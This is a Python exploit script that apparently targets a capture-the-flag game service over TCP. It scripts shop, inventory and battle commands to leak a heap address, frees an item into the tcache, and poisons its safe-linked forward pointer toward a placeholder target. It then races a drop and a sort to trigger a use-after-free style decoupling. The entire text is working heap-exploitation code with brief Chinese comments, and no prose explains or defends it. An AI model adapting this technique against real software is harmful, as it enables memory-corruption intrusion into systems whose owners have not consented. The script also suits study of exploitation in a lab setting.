#!/usr/bin/env python3
# TOCTOU 解耦：drop bomb + sort -> clone(ring 0x170) / destroy(bomb 0x100)
import socket, time, re, struct, sys
HOST=sys.argv[1]; PORT=int(sys.argv[2]); TARGET=0x4141414141414141
def connect(tries=60):
    for i in range(tries):
        s=socket.socket(); s.settimeout(4)
        try: s.connect((HOST,PORT))
        except Exception: time.sleep(3); continue
        s.settimeout(2); b=b""
        try:
            while True:
                d=s.recv(4096)
                if not d: break
                b+=d
                if b"Great Plateau" in b: return s,b
        except Exception: pass
        s.close(); time.sleep(4)
    return None,None
def rx(s,pats,timeout=2.0):
    if isinstance(pats,str): pats=[pats]
    end=time.time()+timeout; out=b""
    while time.time()<end:
        s.settimeout(max(0.05,end-time.time()))
        try: d=s.recv(65536)
        except Exception: break
        if not d: out+=b"<EOF>"; break
        out+=d
        if any(p in out.decode('utf-8','replace') for p in pats): break
    return out.decode('utf-8','replace')
def cmd(s,c,pats,t=2.0):
    s.sendall(c.encode()+b"\n"); time.sleep(0.03); return rx(s,pats,t)
def shot(s):
    s.sendall(b"mw show\n"); time.sleep(0.2); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
            if b"Drops:" in o: break
    except Exception: pass
    return o.decode('utf-8','replace')
def inv(s):
    s.sendall(b"inv list\n"); time.sleep(0.2); s.settimeout(1.5); o=b""
    try:
        while True:
            d=s.recv(65536)
            if not d: o+=b"<EOF>"; break
            o+=d
            if b"Inventory" in o and o.count(b"\n")>2: break
    except Exception: pass
    return o.decode('utf-8','replace')
s,b=connect()
if s is None: print("NO BANNER"); sys.exit(1)
# win
for i in range(5):
    cmd(s,"shop buy 1 1",["tx: item added","not enough"])
    cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    cmd(s,"mw throw 0",["throws equipped item","invalid"])
    cmd(s,"mw pickup 0",["tx: item added","invalid"])
    cmd(s,"shop sell 1",["shop sold","invalid"])
    time.sleep(0.2)
cmd(s,"shop buy 3 34",["tx:","not enough"],3)
cmd(s,"map teleport castle",["Encounter"])
cmd(s,"battle",["player turn"])
cmd(s,"use item",["Enter inventory idx"])
cmd(s,"1",["Enter quantity"])
cmd(s,"34",["Battle won"],4)
cmd(s,"mw pickup 0",["tx: item added","invalid"])
cmd(s,"inv equip 1",["tx: main world equipped","invalid"])
o=shot(s); m=re.search(r"description_addr=0x([0-9a-f]+)",o)
if not m: print("NO RING"); sys.exit(1)
base=int(m.group(1),16); print("[base] 0x%x"%base,flush=True)
# buy 1 bomb -> inventory [ring(equipped,slot1), bomb(slot2)]
cmd(s,"shop buy 3 1",["tx:","not enough"],2)
o=inv(s); print("[inv] "+" | ".join(l.strip() for l in o.splitlines() if l.strip())[:200],flush=True)
# 1) free ring -> transaction tcache, clone R1 in drops
cmd(s,"inv drop 1",["inventory frees","invalid"])
# 2) poison base->fd = enc(T)
fd=TARGET^(base>>12)
cmd(s,"mw whisper 0 "+struct.pack("<Q",fd).hex(),["whispered","only"],3)
o=shot(s); m=re.search(r"description_head=0x([0-9a-f]+)",o)
print("[head poison] "+(m.group(1) if m else "?")+" expect "+hex(fd),flush=True)
# 3) pickup R1 -> inventory. inv now [bomb(slot1), R1(slot2)]
cmd(s,"mw pickup 0",["tx: item added","invalid"])
o=inv(s); print("[inv2] "+" | ".join(l.strip() for l in o.splitlines() if l.strip())[:200],flush=True)
# 4) DECOUPLE: drop bomb(slot1) + sort -> v59=slot1=R1(ring), v151[0]=bomb
s.sendall(b"inv drop 1\ninv sort\n")
time.sleep(1.0)
s.settimeout(2); o=b""
try:
    while True:
        d=s.recv(65536)
        if not d: o+=b"<EOF>"; break
        o+=d
except Exception: pass
print("[decouple out] "+repr(o[-260:]),flush=True)
# 5) check alive + try a clone with ring source to pop T
o=inv(s); print("[inv3] "+" | ".join(l.strip() for l in o.splitlines() if l.strip())[:220],flush=True)
s.close()
